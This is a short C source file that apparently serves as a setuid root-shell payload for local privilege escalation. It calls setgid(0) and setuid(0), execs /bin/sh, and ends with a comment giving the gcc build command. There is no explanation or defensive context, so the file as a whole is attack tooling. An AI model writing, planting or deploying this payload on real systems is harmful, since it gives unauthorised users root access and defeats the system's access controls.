int main(void) {
    setgid(0); setuid(0);
    execl("/bin/sh", "sh", 0);
}

/* gcc -m32 -Wl,--hash-style=both -o suid suid.c */
